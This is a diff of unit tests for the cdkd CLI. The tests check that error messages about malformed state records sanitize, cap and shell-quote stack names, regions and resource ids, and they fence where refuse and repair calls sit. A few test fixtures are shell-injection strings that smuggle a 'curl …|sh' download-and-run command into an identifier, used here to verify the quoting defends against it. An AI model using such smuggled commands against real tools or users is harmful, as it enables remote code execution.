+    // whole. Only the SHORT side of those two sites is pinnable: WIDENING one
+    // (to `Infinity`) is an equivalent mutant and stated rather than pinned —
+    // the gate above has already established that the value renders unaltered,
+    // so nothing a wider cap would admit ever reaches the opening.
+    const atCap = divergentRecordRegionRefusalMessage(
+      'q'.repeat(1152),
+      'r'.repeat(1152),
+      'eu-west-1',
+      1
+    );
+    expect(atCap, 'the opening cut the stack name it names').toContain('q'.repeat(1152));
+    expect(atCap, 'the opening cut the key region it names').toContain('r'.repeat(1152));
+  });
+
+  it('QUOTES a logical id, so a quote in it cannot forge a remedy in the prose', () => {
+    // The ASCII allowlist keeps `'`. The names used to be wrapped in a
+    // hand-written `'...'`, which an id spelled with its own quote CLOSES —
+    // planting a second "Inspect it with:" instruction on the same line, ahead
+    // of the real one. The prose and the command are one line, so being in the
+    // prose is no protection.
+    const FORGED = "x' Inspect it with: curl evil.sh|sh #";
+    for (const text of [
+      malformedResourceEntriesRefusalMessage('S', 'r', [FORGED]),
+      malformedResourceEntriesWarning('S', 'r', [FORGED]),
+    ]) {
+      // The forged instruction survives only INSIDE a quoted argument.
+      expect(text).toContain(`"x' Inspect it with: curl evil.sh|sh #"`);
+      expect(text).not.toContain("— x' Inspect it with:");
+      // ...and the genuine command still closes the line.
+      expect(text.endsWith('cdkd state show S --stack-region r --json')).toBe(true);
+    }
+  });
+
+  it('never renders a PADDED id bare beside the healthy sibling it imitates', () => {
+    // Sanitizing trims, so a sanitize-then-quote pair rendered a torn
+    // `resources["Bucket "]` byte-identically to a healthy `Bucket`, sending the
+    // reader to the intact record. The same rule go-to-k/cdkd#3317 applied to
+    // the properties clause; here both texts, and a plain id as the control
+    // that must stay bare.
+    for (const text of [
+      malformedResourceEntriesRefusalMessage('S', 'r', ['Bucket ', 'Queue']),
+      malformedResourceEntriesWarning('S', 'r', ['Bucket ', 'Queue']),
+    ]) {
+      expect(text).toContain('— "Bucket", Queue —');
+    }
+  });
+
+  it('sanitizes, caps and shell-quotes the STACK and REGION in both texts', () => {
+    // The logical-id case above covers one of the three identifiers these texts
+    // carry. Stack and region are no more trusted -- a stack name reaches a
+    // reader from an S3 KEY and a region from the record BODY -- and unlike the
+    // ids they land INSIDE the command the text tells the user to paste, so
+    // they need the shell quoting as well. Removing either one's sanitization
+    // left every other case in this file green.
+    const FORGERIES = ['\u001b', '\u0085', '\u2028', '\u202e', '\n', '\r', '\u200b'];
+    const hostileStack = `Evil${FORGERIES.join('')}Stack`;
+    const hostileRegion = `us-${FORGERIES.join('')}east-1`;
+    for (const forge of FORGERIES) {
+      expect(hostileStack.includes(forge) && hostileRegion.includes(forge)).toBe(true);
+    }
+
+    for (const text of [
+      malformedResourceEntriesRefusalMessage(hostileStack, hostileRegion, ['R']),
+      malformedResourceEntriesWarning(hostileStack, hostileRegion, ['R']),
+    ]) {
+      for (const forge of FORGERIES) expect(text).not.toContain(forge);
+    }
+
+    // EMPTY after sanitization becomes the named stand-in, never an empty
+    // argument: `--stack-region ''` reads to `cdkd state show` as not supplied,
+    // so it silently widens to every region holding the name. Asserted at each
+    // ARGUMENT of each command — the shared diagnosis above the command also
+    // prints both identifiers, so a `toContain(UNRENDERABLE)` over the whole
+    // text passes with both command arguments left empty.
+    for (const [label, build] of [
+      ['the refusal', malformedResourceEntriesRefusalMessage],
+      ['the warning', malformedResourceEntriesWarning],
+    ] as const) {
+      expect(
+        build('\u0000\u0001', 'r', ['R']),
+        `${label}: an unrenderable STACK no longer stands in inside the command`
+      // QUOTED: `shellQuote` quotes the stand-in because of its angle
+      // brackets, which is the point — an empty argument would not be there
+      // at all, and `--stack-region` would swallow `--json`.
+      ).toContain(`cdkd state show '${UNRENDERABLE}' --stack-region r --json`);
+      expect(
+        build('S', '\u0000', ['R']),
+        `${label}: an unrenderable REGION no longer stands in inside the command`
+      ).toContain(`cdkd state show S --stack-region '${UNRENDERABLE}' --json`);
+    }
+
+    // SHELL-QUOTED inside the command: the ASCII allowlist keeps the quote, `;`
+    // and `|`, so an unquoted name would close the quoting and append its own
+    // command to the line the text says to run. Spelled from raw literals
+    // rather than by calling `shellQuote`, so the expected values are
+    // independent of the code under test.
+    // EACH command ARGUMENT of EACH text, independently. One probe on the
+    // refusal's stack left three other positions unpinned: the warning's stack,
+    // the warning's region and the refusal's region each quote separately, and
+    // removing any one of them survived a single combined assertion.
+    const HOSTILE_ARG = "a'; curl http://x|sh; echo '";
+    const QUOTED_ARG = String.raw`'a'\''; curl http://x|sh; echo '\'''`;
+    for (const [label, build] of [
+      ['the refusal', malformedResourceEntriesRefusalMessage],
+      ['the warning', malformedResourceEntriesWarning],
+    ] as const) {
+      // Asserted as the WHOLE TAIL after each text's own command introducer,
+      // not with `toContain`: the contract is LAST and UNWRAPPED, and a
+      // containment check accepts both mutants that break it — prose appended
+      // after `--json`, and an outer `'...'` wrapper, which composes with
+      // `shellQuote`'s own quoting into something unpastable.
+      const marker = label === 'the refusal' ? 'Inspect it with: ' : 'See the stored values with: ';
+      const tail = (text: string): string => {
+        expect(text, `${label}: the command introducer is gone`).toContain(marker);
+        return text.slice(text.indexOf(marker) + marker.length);
+      };
+      expect(
+        tail(build(HOSTILE_ARG, 'r', ['R'])),
+        `${label}: the stack argument is no longer shell-quoted, or the command is not last`
+      ).toBe(`cdkd state show ${QUOTED_ARG} --stack-region r --json`);
+      expect(
+        tail(build('S', HOSTILE_ARG, ['R'])),
+        `${label}: the region argument is no longer shell-quoted, or the command is not last`
+      ).toBe(`cdkd state show S --stack-region ${QUOTED_ARG} --json`);
+      // ...and each is CAPPED in its own text, not only in the one the
+      // distance assertion above measured.
+      // The STACK takes `STACK_REF_MAX_CODE_POINTS` (1152), not an identifier's
+      // 128: a cdkd record's stack name is `parent~child` applied recursively,
+      // so 128 truncated a legitimate nested name and the remedy command then
+      // named a stack that does not exist.
+      const longStack = build('q'.repeat(5000), 'r', ['R']);
+      expect(longStack, `${label}: the stack argument is no longer capped`).toContain(
+        `${'q'.repeat(1152)}...`
+      );
+      expect(longStack, `${label}: the stack cap widened past the stack-ref bound`).not.toContain(
+        'q'.repeat(1153)
+      );
+      // The DIAGNOSIS half carries the wider cap too, not only the remedy
+      // command: they are separate `safeIdentifier` calls, so capping one at an
+      // identifier's 128 while the other keeps 1152 passes an assertion that
+      // looks at the message as a whole.
+      expect(
+        longStack.slice(0, longStack.indexOf('cannot be read as resources')),
+        `${label}: the DIAGNOSIS still caps the stack name at an identifier's width`
+      ).toContain(`${'q'.repeat(1152)}...`);
+      expect(longStack.length).toBeLessThan(3000);
+      const longRegion = build('S', 'r'.repeat(5000), ['R']);
+      expect(longRegion, `${label}: the region argument is no longer capped`).toContain(
+        `${'r'.repeat(128)}...`
+      );
+      expect(longRegion.length).toBeLessThan(1200);
+    }
+  });
+
+  it('BOTH texts forward the whole list, named and counted the same way', () => {
+    // The refusal's forwarding is pinned by its own multi-entry case; this is
+    // the WARNING's, which plain `cdkd drift` and `cdkd diff --recursive` emit.
+    // A slice on either call site drops rows from the only report a read-only
+    // command gives, and the two are separate call sites into the shared
+    // clause, so one fixture cannot cover both.
+    const ids = ['A1', 'B2', 'C3', 'D4', 'E5', 'F6'];
+    for (const [label, text] of [
+      ['the refusal', malformedResourceEntriesRefusalMessage('S', 'r', ids)],
+      ['the warning', malformedResourceEntriesWarning('S', 'r', ids)],
+    ] as const) {
+      expect(text, `${label}: the total is no longer the whole list`).toContain(
+        '6 resource record(s)'
+      );
+      for (const id of ids.slice(0, 5)) {
+        expect(text, `${label}: ${id} is no longer named`).toContain(id);
+      }
+      expect(text, `${label}: the overflow summary is gone`).toContain('and 1 more');
+      expect(text, `${label}: a capped-out id is named anyway`).not.toContain('F6');
+    }
+  });
+
+  it('the warning and the refusal share a diagnosis and differ in what happens next', () => {
+    const ids = ['Row1'];
+    const refusal = malformedResourceEntriesRefusalMessage('MyStack', 'eu-west-1', ids);
+    const warning = malformedResourceEntriesWarning('MyStack', 'eu-west-1', ids);
+    // One spelling of WHAT IS WRONG — two copies of a diagnosis is what drifts,
+    // which is the whole reason the clause is shared in the module.
+    const diagnosis = 'because they are not objects, or carry no resource type';
+    expect(refusal).toContain(diagnosis);
+    expect(warning).toContain(diagnosis);
+    // The DIAGNOSIS carries the pair too, and it is a second forwarding hop
+    // from the command's: spelling the region as a second copy of the stack
+    // name left both remedy commands correct and every other case green, while
+    // the sentence told the reader the record lives somewhere it does not.
+    expect(refusal).toContain("State for MyStack (eu-west-1)");
+    expect(warning).toContain("State for MyStack (eu-west-1)");
+    // ...and the DIAGNOSIS quotes both identifiers as well, which the remedy
+    // tails above do not establish: dropping `shellQuote` from either one there
+    // left every case green, because the only hostile fixtures reached the
+    // command. A name carrying a space renders unquoted as two words and reads
+    // as a different record.
+    const SPACED = 'my stack';
+    expect(
+      malformedResourceEntriesRefusalMessage(SPACED, 'eu west 1', ['R']),
+      'the refusal diagnosis no longer quotes its identifiers'
+    ).toContain("State for 'my stack' ('eu west 1')");
+    expect(
+      malformedResourceEntriesWarning(SPACED, 'eu west 1', ['R']),
+      'the warning diagnosis no longer quotes its identifiers'
+    ).toContain("State for 'my stack' ('eu west 1')");
+    // ...and opposite verdicts, so neither text can be swapped for the other.
+    expect(refusal).toContain('refuses');
+    expect(warning).toContain('Continuing WITHOUT them');
+    expect(warning).not.toContain('refuses');
   });
 });
 
@@ -1482,8 +2217,9 @@ describe('write-capable commands refuse; read-only ones repair', () => {
    * Derived by grep rather than by recall:
    *   grep -n "^export function refuseMalformed" \
    *     src/state/malformed-resources-bag.ts
-   * then subtracting the `Outputs` and `ResourceProperties` families, which
-   * the partition case below re-derives so a fourth cannot be added unnoticed.
+   * then subtracting the `Outputs`, `ResourceProperties` and `ResourceEntries`
+   * families, which the partition case below re-derives so another cannot be
+   * added unnoticed.
    */
   const RESOURCES_REFUSAL_SPELLINGS = [
     'refuseMalformedState(',
@@ -1492,7 +2228,8 @@ describe('write-capable commands refuse; read-only ones repair', () => {
   ];
 
   /**
-   * The module's refusal entry points partition into exactly three containers.
+   * The module's refusal entry points partition into exactly four classes: the
+   * `outputs`, `properties` and `resources` containers, and the ENTRY guard.
    *
    * A UNION count alone would stay green through a RE-CLASSIFICATION — an
    * `outputs` refusal renamed into the `resources` family keeps the total
@@ -1500,17 +2237,22 @@ describe('write-capable commands refuse; read-only ones repair', () => {
    * asserted EMPTY so a helper belonging to none of them fails here instead of
    * silently escaping every dominance loop in this file.
    */
-  it('every refusal the module exports is classified into exactly one container', () => {
+  it('every refusal the module exports is classified into exactly one class', () => {
     const moduleSrc = code('src/state/malformed-resources-bag.ts');
     const exported = [...moduleSrc.matchAll(/export function (refuseMalformed\w*)\(/g)].map(
       (m) => `${m[1]!}(`
     );
-    expect(exported.length, 'the grep stopped matching; this fence is reading nothing').toBe(8);
+    expect(exported.length, 'the grep stopped matching; this fence is reading nothing').toBe(9);
 
     const outputs = exported.filter((n) => /Outputs\(|Outputs[A-Z]/.test(n));
     const properties = exported.filter((n) => n.includes('ResourceProperties'));
+    // The ENTRY guard (go-to-k/cdkd#3018) is its own class: opt-in per flow, and
+    // not a `resources` BAG refusal, so a dominance check keyed on the bag's
+    // spellings must not treat it as one.
+    const entries = exported.filter((n) => n.includes('ResourceEntries'));
+    expect(entries).toEqual(['refuseMalformedResourceEntries(']);
     const resources = exported.filter(
-      (n) => !outputs.includes(n) && !properties.includes(n)
+      (n) => !outputs.includes(n) && !properties.includes(n) && !entries.includes(n)
     );
     // Derived from REFUSAL_SPELLINGS rather than re-spelled: a second hard-coded
     // copy of that triple is what drifts when a fourth outputs refusal lands.
@@ -1713,6 +2455,17 @@ describe('write-capable commands refuse; read-only ones repair', () => {
       const src = code(file);
       expect(src).toContain('repairMalformedResourcesForReadOnly(');
       expect(src).toContain('malformedResourcesWarning(');
+      // BOTH halves, since go-to-k/cdkd#3018. The bag repair alone left this
+      // file dereferencing a null ENTRY in its two nested-child walks, and the
+      // sweep that produced the residual list could not see it: a file that
+      // IMPORTS this module reads as remedied whether or not it took the half
+      // that applies to it.
+      expect(
+        src.includes('repairMalformedResourceEntriesForReadOnly('),
+        `${file} repairs the BAG but not its ENTRIES; hasReadableResources tests the bag, so ` +
+          `{"resources": {"R": null}} survives that repair and throws at the first entry read.`
+      ).toBe(true);
+      expect(src).toContain('malformedResourceEntriesWarning(');
       expect(
         src.includes('saveState('),
         `${file} now writes state, so repairing a malformed bag there can launder the record ` +
@@ -1972,10 +2725,11 @@ describe('write-capable commands refuse; read-only ones repair', () => {
       // audited-record refusal raised above `scrubStack`'s seam — so no
       // behavioural case in this repo reaches it, and it interpolated stack
       // names RAW from go-to-k/cdkd#3018 until go-to-k/cdkd#3206's review. A
-      // source fence is what fits: the names must go through the SHARED
-      // `safeIdentifier` (sanitize + 128-code-point cap + `UNRENDERABLE`), not
-      // a bare `.join`, and not a local half-copy that sanitizes without
-      // capping — which is exactly what the first fix shipped.
+      // source fence is what fits: the names must go through a SHARED helper
+      // that sanitizes, caps and stands in `UNRENDERABLE` — `displayIdent`,
+      // which also JSON-quotes any name that needs it, so a name carrying the
+      // list's delimiter cannot forge an entry — not a bare `.join`, and not a local half-copy that sanitizes
+      // without capping, which is exactly what the first fix shipped.
       if (file === 'src/cli/commands/scrub.ts') {
         expect(
           src,
@@ -2251,13 +3005,18 @@ describe('the retried refusals are marked non-retryable (issue #3207)', () => {
    */
   const UNMARKED: Record<string, string> = {
     'refuseMalformedState(':
-      'its callers are `cdkd import`, `cdkd orphan` and `cdkd rollback`, none of which wraps ' +
-      'the call in withRetry — so the marker would fence nothing. Revisit if a retrying caller ' +
-      'is added.',
+      'its callers are `cdkd import`, `cdkd orphan`, `cdkd rollback`, `cdkd state ' +
+      'refresh-observed` and `cdkd drift --accept` / `--revert`, none of which wraps the call ' +
+      'in withRetry — so the marker would fence nothing. Revisit if a retrying caller is added.',
     'refuseMalformedResourcePropertiesForOrphan(':
       'go-to-k/cdkd#3318. Its ONE caller is `cdkd orphan`, raising from the command body beside ' +
       'the exempt sibling above — `rewriteResourceReferences` is called from nowhere else, so ' +
       'no withRetry encloses it and the marker would fence nothing. Revisit if a retrying ' +
+      'caller is added.',
+    'refuseMalformedResourceEntries(':
+      'its callers are `cdkd state refresh-observed` (the multi-stack pre-check and the per-stack ' +
+      'refresh) and `cdkd drift --accept` / `--revert`, none of which wraps the call in withRetry ' +
+      '— drift retries only the provider update, well after this refusal. Revisit if a retrying ' +
       'caller is added.',
   };
 
@@ -2266,7 +3025,7 @@ describe('the retried refusals are marked non-retryable (issue #3207)', () => {
     const exported = [...moduleSrc.matchAll(/export function (refuseMalformed\w*)\(/g)].map(
       (m) => `${m[1]!}(`
     );
-    expect(exported.length, 'the grep stopped matching; this fence is reading nothing').toBe(8);
+    expect(exported.length, 'the grep stopped matching; this fence is reading nothing').toBe(9);
     // A refusal is MARKED when its body reaches `markNonRetryable`. Read from
     // the body rather than from the RETRIED table, so the two instruments stay
     // independent — the table proves the marker is SET at runtime, this proves
@@ -2344,12 +3103,28 @@ describe('unreadableResourcePropertyBags (issue go-to-k/cdkd#3191)', () => {
   });
 
   it('SKIPS an entry that is not a readable object, leaving that class to its own guard', () => {
-    // ORDER-INDEPENDENCE with the entry-level guard go-to-k/cdkd#3226 adds. A
-    // `null` entry has no `properties` to test and a string entry's would be a
-    // per-character read of the entry's own defect, so naming either here
-    // would report this container for another one's damage — and the verdict
-    // would then depend on which guard ran first.
+    // A `null` entry has no `properties` to test and a string entry's would be
+    // a per-character read of the entry's own defect, so naming either here
+    // would report this container for another one's damage. That keeps this
+    // verdict independent of the entry guard for every NON-object entry — the
+    // case below is the one shape where it is not.
     expect(unreadableResourcePropertyBags(state({ A: null, B: 'torn', C: 5 }))).toEqual([]);
+  });
+
+  it('STILL names a typeless OBJECT entry whose map is torn — the deploy path has no entry guard', () => {
+    // The overlap with the entry guard, kept on purpose. `DiffCalculator` takes
+    // this predicate WITHOUT `unreadableResourceEntries`, so narrowing the
+    // object test here to "a readable resource entry" would let a typeless
+    // object with a torn map reach the comparison unrefused. The typed torn
+    // row is the control that the case is not satisfied by naming everything.
+    expect(
+      unreadableResourcePropertyBags(
+        state({
+          A: { physicalId: 'p', properties: 'x' },
+          B: { physicalId: 'p', resourceType: 'T', properties: { K: 'v' } },
+        })
+      )
+    ).toEqual(['A']);
   });
 
   for (const [label, value] of UNREADABLE) {
@@ -2605,14 +3380,22 @@ describe('the malformed-properties texts (issue go-to-k/cdkd#3191)', () => {
     });
 
     it(`${build.name} CAPS a multi-kilobyte stack name so the remedy stays on screen`, () => {
+      // By the STACK rule (`STACK_REF_MAX_CODE_POINTS`, 1152), which every
+      // builder in this module takes for a stack name; the cross-builder case
+      // asserts the same cap for each occurrence.
       const long = build('q'.repeat(5000), 'us-east-1', ['A']);
-      expect(long).toContain(`${'q'.repeat(128)}...`);
+      expect(long).toContain(`${'q'.repeat(1152)}...`);
+      expect(long).not.toContain('q'.repeat(1153));
       expect(long).toContain('cdkd state show');
-      expect(long.length).toBeLessThan(2500);
+      // The orphan refusal prints the stack THREE times (clause, inspect and
+      // drop commands), so its bound is wider; the two-copy texts keep theirs,
+      // or a third copy of the name in them would pass unnoticed.
+      const bound = build === malformedOrphanResourcePropertiesRefusalMessage ? 5600 : 3500;
+      expect(long.length).toBeLessThan(bound);
     });
 
     it(`${build.name} caps a multi-kilobyte LOGICAL ID at the id's own length`, () => {
-      // NOT the shared helper's 128: a CloudFormation logical id is valid up
+      // NOT a region-sized 128: a CloudFormation logical id is valid up
       // to IDENT_MAX_CODE_POINTS, and truncating a legitimate one names no
       // record. The at-cap arm is the control — without it the case also
       // passes for a renderer that cuts everything.
@@ -2845,8 +3628,9 @@ describe('the cdkd orphan properties refusal (issue go-to-k/cdkd#3318)', () => {
 
     // The object path names a REAL key only when the stack name renders
     // exactly. The name is an assembly's, which `cdkd orphan` reads unvalidated
-    // from a prebuilt manifest, so one past the 128 cap the prose uses is
-    // reachable and must still get its full path — the `~` spelling here is a
+    // from a prebuilt manifest, so one past 128 code points (a region's cap,
+    // and the stack cap this path once had) is reachable and must still get its
+    // full path — the `~` spelling here is a
     // hand-built manifest's, not a nested child's S3 key.
     const nested = `Root~${'N'.repeat(80)}~${'C'.repeat(80)}`;
     expect(nested.length).toBeGreaterThan(128);
@@ -2915,7 +3699,7 @@ describe('the cdkd orphan properties refusal (issue go-to-k/cdkd#3318)', () => {
       expect(text).not.toContain(HINT);
     });
 
-    it('keeps the FULL name of a hand-crafted-manifest name past the 128 prose cap', () => {
+    it('keeps the FULL name of a hand-crafted-manifest name past 128 code points', () => {
       // At 128 the command ended in a literal `...`, which `cdkd state orphan`
       // resolves to zero records and reports as a skip at exit 0 — a silent
       // no-op remedy printed beside a correct object path. The `~` spelling is
@@ -3046,7 +3830,7 @@ describe('the cdkd orphan properties refusal (issue go-to-k/cdkd#3318)', () => {
         expect(m, 'the inspect line is no longer rendered in the expected shape').not.toBeNull();
         return m![1]!;
       };
-      // Exact: substituted, full spelling past the 128 prose cap, qualified.
+      // Exact: substituted, full spelling past 128 code points, qualified.
       const long = 'L'.repeat(200);
       expect(
         inspectOf(malformedOrphanResourcePropertiesRefusalMessage(long, 'us-east-1', ['A'], recovery))
@@ -3706,5 +4490,327 @@ describe('producerRecordKey is injective over (stack, region) — go-to-k/cdkd#3
         'producerRecordKey('
       );
     }
+  });
+});
+
+describe('a file hosting BOTH a read-only view and a writer refuses per FLOW', () => {
+  /**
+   * The index immediately AFTER the `}` closing the `{` at `openAt`, by COUNTING
+   * braces — an exclusive endpoint, which is what `String.prototype.slice`
+   * takes and what both callers pass it.
+   *
+   * Needed because slicing "from the `else` to the end of the function" is not
+   * the else ARM — code after the branch reads as if it were inside it, which
+   * is exactly the mutant (repairs moved out of the `else` into an
+   * unconditional block) an earlier cut of this fence let through.
+   */
+  function matchingCloseBrace(src: string, openAt: number): number {
+    expect(src[openAt], 'matchingCloseBrace was not given an opening brace').toBe('{');
+    let depth = 0;
+    for (let i = openAt; i < src.length; i++) {
+      if (src[i] === '{') depth++;
+      else if (src[i] === '}' && --depth === 0) return i + 1;
+    }
+    throw new Error('unbalanced braces in the sliced flow');
+  }
+
+  /**
+   * Slice `src` to the body of the top-level function starting at `anchor`.
+   *
+   * The end is the next `\n}` at COLUMN ZERO, which for a top-level function
+   * declaration is its own closing brace — every brace inside the body is
+   * indented. Returning the whole file on a miss would make every assertion
+   * below pass for the wrong reason, so the caller asserts the slice is real
+   * before reading it.
+   */
+  function flow(src: string, anchor: string): string {
+    const start = src.indexOf(anchor);
+    expect(start, `anchor \`${anchor}\` is stale; this fence is slicing nothing`).toBeGreaterThan(
+      -1
+    );
+    const end = src.indexOf('\n}\n', start);
+    expect(end, `no column-zero close after \`${anchor}\``).toBeGreaterThan(start);
+    return src.slice(start, end);
+  }
+
+  it('src/cli/commands/state.ts — refresh-observed refuses both shapes before it reads either', () => {
+    const src = code('src/cli/commands/state.ts');
+    const body = flow(src, 'async function refreshObservedForStack(');
+
+    // The premise: this flow is the file's writer. If it stops persisting, the
+    // classification should be revisited rather than silently inherited.
+    expect(body, 'refreshObservedForStack no longer calls saveState').toContain('saveState(');
+
+    const bagRefusal = body.indexOf('refuseMalformedState(');
+    const entryRefusal = body.indexOf('refuseMalformedResourceEntries(');
+    expect(bagRefusal, 'refreshObservedForStack no longer refuses a malformed BAG').toBeGreaterThan(
+      -1
+    );
+    expect(
+      entryRefusal,
+      'refreshObservedForStack no longer refuses an unreadable ENTRY, which `refuseMalformedState` ' +
+        'does not cover: it tests the bag, so `{"R": null}` passes it.'
+    ).toBeGreaterThan(-1);
+
+    // DOMINANCE over the walk AND over the dry-run branch. The dry run has its
+    // own loop precisely so it reaches the same verdict in the same order, so a
+    // refusal below the branch would let `--dry-run` plan a refresh the real run
+    // refuses — the asymmetry issue go-to-k/cdkd#2944 already paid for once.
+    const walk = body.indexOf('Object.entries(state.resources');
+    const dryRun = body.indexOf('if (opts.dryRun)');
+    expect(walk, "refreshObservedForStack's bag walk moved; this anchor is stale").toBeGreaterThan(
+      -1
+    );
+    expect(dryRun, "refreshObservedForStack's dry-run branch moved").toBeGreaterThan(-1);
+    expect(Math.max(bagRefusal, entryRefusal)).toBeLessThan(walk);
+    expect(Math.max(bagRefusal, entryRefusal)).toBeLessThan(dryRun);
+
+    // NOT pinned here: which of the two refusals comes first. An earlier
+    // revision asserted the bag one must, reasoning that the entry helper's
+    // `[]` answer for an unreadable bag would otherwise let a string bag reach
+    // the walk. That reasoning is wrong — with the order reversed the entry
+    // call returns and the bag call still throws, above the walk either way —
+    // so the assertion rejected a safe ordering for a failure that cannot
+    // happen. The invariant that DOES matter is the composition rule, and it
+    // is pinned where it lives: `refuseMalformedResourceEntries stays silent on
+    // an unreadable BAG` in this file's helper cases.
+
+    // NEITHER repair helper may be inside this flow, only elsewhere in the file
+    // — that is exactly what makes this file mixed rather than wrong. Both, not
+    // just the bag one: dropping the unreadable ENTRIES before the save would
+    // delete the evidence from the record this flow then persists, which is the
+    // same laundering by a narrower door.
+    for (const repair of [
+      'repairMalformedResourcesForReadOnly',
+      'repairMalformedResourceEntriesForReadOnly',
+    ]) {
+      expect(
+        body.includes(repair),
+        `refreshObservedForStack calls ${repair} but persists the record.`
+      ).toBe(false);
+    }
+    // The CALL, not the import: `src.includes('repairMalformedResourcesForReadOnly')`
+    // matched the import line, so replacing both read-only repair calls with
+    // `false` left this premise green and the file no longer mixed at all. The
+    // open paren is what the import cannot supply.
+    // PER SITE, not a file-wide count: removing the repair from one read-only
+    // load site and duplicating it at the other keeps the total at two while
+    // the record that site renders goes back to aborting.
+    //
+    // What this does NOT establish, stated rather than implied: that the call
+    // RUNS. A source fence reads text, so `if (false && repair(...))` satisfies
+    // it, and no grep can decide reachability. What covers that is behavioural
+    // — `tests/unit/cli/state-record-shape.test.ts` drives both of these views
+    // over malformed records through the real backend — and this fence's job is
+    // the complementary one: that the call is here at all, in this function,
+    // and is not the import.
+    for (const site of ['async function stateResourcesCommand(', 'function repairRecordForTextRender(']) {
+      expect(
+        flow(src, site).match(/repairMalformedResourcesForReadOnly\(/g) ?? [],
+        `${site} no longer CALLS the read-only repair; if this view stopped needing it, ` +
+          'state.ts is no longer mixed and belongs in REFUSE above.'
+      ).toHaveLength(1);
+    }
+    // The file's only LITERAL `saveState` is in this flow, which is the other
+    // half of "mixed": a second one elsewhere in the file would be a writer
+    // inheriting the read-only repair above it, with nothing here to notice.
+    // Deliberately narrower than "state.ts does not write anywhere else" —
+    // `cdkd state destroy` writes through `runDestroyForStack`, in another
+    // module, and no grep over this file can see that.
+    expect(src.match(/saveState\(/g) ?? []).toHaveLength(1);
+    expect(body.match(/saveState\(/g) ?? []).toHaveLength(1);
+  });
+
+  it('src/cli/commands/drift.ts — the mode decides, and the decision is made beside the flags', () => {
+    const src = code('src/cli/commands/drift.ts');
+    const body = flow(src, 'async function runDriftForStack(');
+
+    // Both arms present in the one flow: this is the file where the module's
+    // two halves meet.
+    expect(body).toContain('refuseMalformedState(');
+    expect(body).toContain('refuseMalformedResourceEntries(');
+    expect(body).toContain('repairMalformedResourcesForReadOnly(');
+    expect(body).toContain('repairMalformedResourceEntriesForReadOnly(');
+
+    // DOMINANCE over this flow's first dereference, for all FOUR calls. The bag
+    // pair alone is not enough: moving either ENTRY helper below the walk leaves
+    // `resource.resourceType` dereferencing an unreadable row exactly as before,
+    // and a fence checking only the bag pair reads green through it.
+    const walk = body.indexOf('Object.entries(state.resources');
+    expect(walk, "runDriftForStack's bag walk moved; this anchor is stale").toBeGreaterThan(-1);
+    for (const call of [
+      'refuseMalformedState(',
+      'refuseMalformedResourceEntries(',
+      'repairMalformedResourcesForReadOnly(',
+      'repairMalformedResourceEntriesForReadOnly(',
+    ]) {
+      const at = body.indexOf(call);
+      expect(at, `${call} is no longer in runDriftForStack`).toBeGreaterThan(-1);
+      expect(at, `${call} now runs AFTER this flow's first bag walk`).toBeLessThan(walk);
+    }
+
+    // The mode must be CONSUMED, not merely produced, and the two ARMS must be
+    // the ones the mode selects. The call-site assertion below pins the
+    // expression that computes it; replacing the branch here with a constant —
+    // `if (false)`, or dropping the `else` — leaves that expression untouched
+    // and every behavioural case for the surviving arm green.
+    //
+    // Sliced rather than matched with `[\s\S]*`, which an earlier cut used: that
+    // reached an UNRELATED later `else` in the same function, so deleting this
+    // branch's own `else` left the fence green.
+    const ifAt = body.indexOf("if (malformedRecordMode === 'refuse') {");
+    expect(ifAt, 'runDriftForStack no longer branches on the mode it is passed').toBeGreaterThan(
+      -1
+    );
+    // The refuse arm's own closing brace, then its OWN adjacent `else`. An
+    // earlier cut took the first `} else {` at or after the `if`, which a
+    // `if (mode === 'refuse') {} if (true) {` rewrite satisfies with an
+    // UNRELATED branch further down — the repairs would then run in both modes.
+    const refuseClose = matchingCloseBrace(body, body.indexOf('{', ifAt));
+    expect(
+      body.slice(refuseClose - 1).startsWith('} else {'),
+      "the refuse arm's own closing brace is no longer followed by its else"
+    ).toBe(true);
+    const elseAt = refuseClose - 1;
+    const refuseArm = body.slice(ifAt, elseAt);
+    // The repair arm ends at its own closing brace, found by COUNTING, not at
+    // the end of the function: `body.slice(elseAt)` swept up everything after
+    // the branch, so moving the repairs OUT of the `else` into an unconditional
+    // block below it left this green — and they would then run in refuse mode
+    // too, inert only because the refusal threw first.
+    const repairArm = body.slice(elseAt, matchingCloseBrace(body, body.indexOf('{', elseAt)));
+    // CONFINEMENT, not presence: each call must appear in its own arm and
+    // EXACTLY ONCE in the whole flow. Checking the arms alone permits a
+    // duplicate immediately after the branch, which runs in both modes — inert
+    // today only because the refusal threw first, which is the kind of "inert
+    // for now" this fence exists to refuse.
+    function occurrences(haystack: string, needle: string): number {
+      return haystack.split(needle).length - 1;
+    }
+    for (const [arm, other, call] of [
+      [refuseArm, repairArm, 'refuseMalformedState('],
+      [refuseArm, repairArm, 'refuseMalformedResourceEntries('],
+      [repairArm, refuseArm, 'repairMalformedResourcesForReadOnly('],
+      [repairArm, refuseArm, 'repairMalformedResourceEntriesForReadOnly('],
+    ] as const) {
+      expect(arm, `${call} is no longer inside its own arm`).toContain(call);
+      expect(other, `${call} leaked into the other arm`).not.toContain(call);
+      expect(
+        occurrences(body, call),
+        `${call} appears more than once in runDriftForStack, so one copy runs in BOTH modes`
+      ).toBe(1);
+    }
+
+    // The decision itself, pinned where it is MADE. `--accept` / `--revert` are
+    // the only modes that reach `saveState`, and both rebuild the bag as a
+    // spread, so both alternatives to refusing lose the evidence for the shape
+    // that gets that far: a bag hand-edited into a LIST OF RESOURCE OBJECTS
+    // walks fine, so spreading it unrepaired persists phantom rows keyed `0`,
+    // `1`, while repairing it first persists a legitimate-looking empty stack.
+    // No other shape reaches the spread: a non-empty string or a list with an
+    // unreadable element throws in the walk, and the rest walk to zero entries
+    // and report nothing.
+    // Whitespace-NORMALISED before matching: the expression is 62 characters
+    // today, so one rename wraps it across lines and a source-literal regex
+    // reds on a formatter's decision rather than on a behaviour change.
+    const flat = src.replace(/\s+/g, ' ');
+    expect(
+      flat,
+      'the drift mode no longer decides refuse-vs-repair from --accept / --revert, so a ' +
+        'write-capable run can reach the read-only repair.'
+    ).toContain("options.accept || options.revert ? 'refuse' : 'repair'");
+
+    // Non-vacuity for the spread claim above, COUNTED rather than tested for
+    // presence: there are two writers (`--accept` and `--revert`) and each
+    // rebuilds the bag itself, so a `toContain` survives either one changing
+    // shape. If either stops being a spread the reasoning behind the refusal
+    // changes for that writer and has to be re-derived.
+    for (const writer of ['async function runAccept(', 'async function runRevert(']) {
+      expect(
+        flow(src, writer)
+          .replace(/\s+/g, ' ')
+          .match(/\{ \.\.\.report\.state\.resources \}/g) ?? [],
